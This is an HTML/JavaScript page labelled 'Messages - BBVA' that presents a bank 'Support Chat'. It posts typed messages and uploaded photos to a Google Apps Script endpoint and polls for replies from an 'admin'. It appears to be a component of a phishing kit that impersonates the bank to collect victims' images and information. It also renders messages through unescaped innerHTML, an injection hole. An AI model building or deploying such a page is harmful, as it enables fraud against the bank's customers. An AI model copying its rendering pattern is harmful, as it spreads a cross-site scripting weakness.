<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messages - BBVA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #041530; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .chat-container { height: calc(100vh - 140px); overflow-y: auto; padding-bottom: 20px; }
        .message-bubble { max-width: 75%; padding: 12px 16px; border-radius: 18px; margin-bottom: 8px; }
        .received { background: #1f1f1f; border-bottom-left-radius: 4px; }
        .sent { background: #1475d9; color: white; border-bottom-right-radius: 4px; }
        img { max-width: 240px; border-radius: 12px; margin: 4px 0; }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col">

    <header class="flex items-center justify-between px-6 py-4 border-b border-blue-900 bg-[#041530]">
        <button onclick="goBackToDashboard()" class="text-blue-400">← Back</button>
        <div class="text-center">
            <p class="font-medium">Support Chat</p>
        </div>
        <div></div>
    </header>

    <div id="chatContainer" class="flex-1 p-4 chat-container bg-[#020b18]">
    </div>

    <div class="p-4 border-t border-blue-900 bg-[#041530]">
        <div class="flex gap-2">
            <input type="text" id="messageInput" placeholder="Type message..." 
                   class="flex-1 bg-[#072146] border border-blue-800 rounded-2xl px-5 py-3 focus:outline-none" 
                   onkeypress="if(event.key==='Enter') sendMessage()">
            <button onclick="sendMessage()" class="bg-blue-600 px-6 rounded-2xl">Send</button>
        </div>
        <div class="text-center mt-3">
            <input type="file" id="photoUpload" accept="image/*" class="hidden" onchange="sendPhoto(this)">
            <button onclick="document.getElementById('photoUpload').click()" class="text-blue-400 text-sm">📎 Send Photo</button>
        </div>
    </div>

    <script>
        const API_URL = "https://script.google.com/macros/s/AKfycbyIvkHELP41Lf8zzdjilYWozkwbUS18HEajXA7yBpV5xoxVw7vJ6zPAVyf8LN85y2FdFw/exec";
        let userId = localStorage.getItem("userId");

        if (!userId) window.location.href = "index.html";

        let messagesCache = [];

        function renderMessages() {
            const container = document.getElementById('chatContainer');
            let html = '';
            messagesCache.forEach(msg => {
                const isSent = msg.sender === userId;
                html += `
                    <div class="flex ${isSent ? 'justify-end' : 'justify-start'}">
                        <div class="message-bubble ${isSent ? 'sent' : 'received'}">
                            ${msg.message.includes('data:image') ? `<img src="${msg.message}">` : msg.message}
                            <div class="text-xs opacity-70 mt-1">${msg.timestamp}</div>
                        </div>
                    </div>
                `;
            });
            container.innerHTML = html;
            container.scrollTop = container.scrollHeight;
        }

        async function loadMessages() {
            try {
                const res = await fetch(`${API_URL}?action=getMessages&userId=${userId}`);
                const result = await res.json();
                if (result.status === "success") {
                    messagesCache = result.messages.filter(m => 
                        m.sender === userId || m.receiver === userId || m.sender === "admin"
                    );
                    renderMessages();
                }
            } catch(e) {}
        }

        async function sendMessage() {
            const input = document.getElementById('messageInput');
            const text = input.value.trim();
            if (!text) return;

            const temp = { sender: userId, message: text, timestamp: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) };
            messagesCache.push(temp);
            renderMessages();

            try {
                await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "text/plain" },
                    body: JSON.stringify({ action: "submitMessage", senderId: userId, message: text })
                });
            } catch(e) {}
            input.value = '';
        }

        async function sendPhoto(input) {
            if (!input.files[0]) return;
            const reader = new FileReader();
            reader.onload = async function(e) {
                const base64 = e.target.result;
                const temp = { sender: userId, message: base64, timestamp: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) };
                messagesCache.push(temp);
                renderMessages();

                try {
                    await fetch(API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "text/plain" },
                        body: JSON.stringify({ action: "submitMessage", senderId: userId, message: base64 })
                    });
                } catch(e) {}
            };
            reader.readAsDataURL(input.files[0]);
        }

        function goBackToDashboard() {
            window.location.href = "index.html";
        }

        loadMessages();
        setInterval(loadMessages, 4000);
    </script>
</body>
</html>
